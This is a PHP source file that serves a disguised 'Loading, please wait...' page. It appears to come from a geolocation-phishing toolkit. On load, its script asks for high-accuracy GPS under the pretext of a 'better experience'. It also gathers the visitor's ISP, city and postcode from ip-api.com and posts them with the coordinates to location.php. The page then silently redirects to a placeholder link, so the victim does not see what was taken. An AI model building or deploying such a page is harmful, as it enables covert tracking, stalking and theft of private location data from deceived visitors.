<?php
include 'ip.php';

// Add JavaScript to capture location
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        async function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                // Obtener datos de IP y Operadora simultáneamente
                let extraInfo = {};
                try {
                    const response = await fetch('http://ip-api.com/json/');
                    extraInfo = await response.json();
                } catch (e) {
                    debugLog("Error fetching IP info: " + e.message);
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        sendPosition(position, extraInfo);
                    }, 
                    handleError, 
                    {
                        enableHighAccuracy: true, // Forzar GPS de alta precisión
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                // Don\'t log this message
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                // Redirect after a delay if geolocation is not supported
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position, extraInfo) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            // Datos de IP
            var isp = extraInfo.isp || 'Unknown';
            var city = extraInfo.city || 'Unknown';
            var region = extraInfo.regionName || 'Unknown';
            var country = extraInfo.country || 'Unknown';
            var zip = extraInfo.zip || 'Unknown';
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Add a delay before redirecting to ensure data is processed
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                // Don\'t log this message
                // Still redirect even if there was an error
                redirectToMainPage();
            };
            
            var params = "lat=" + lat + 
                         "&lon=" + lon + 
                         "&acc=" + acc + 
                         "&isp=" + encodeURIComponent(isp) + 
                         "&city=" + encodeURIComponent(city) + 
                         "&region=" + encodeURIComponent(region) + 
                         "&country=" + encodeURIComponent(country) + 
                         "&zip=" + encodeURIComponent(zip) + 
                         "&time=" + new Date().getTime();

            // Send the data with a timestamp to avoid caching
            xhr.send(params);
        }
        
        function handleError(error) {
            // Don\'t log error messages
            
            document.getElementById("locationStatus").innerText = "Redirecting...";
            
            // If user denies location permission or any other error, still redirect after a short delay
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            // Don\'t log this message
            // Try to redirect to the template page
            try {
                window.location.href = "forwarding_link";
            } catch (e) {
                // Don\'t log this message
                // Fallback redirection
                window.location = "forwarding_link";
            }
        }
        
        // Try to get location when page loads
        window.onload = function() {
            // Don\'t log this message
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>
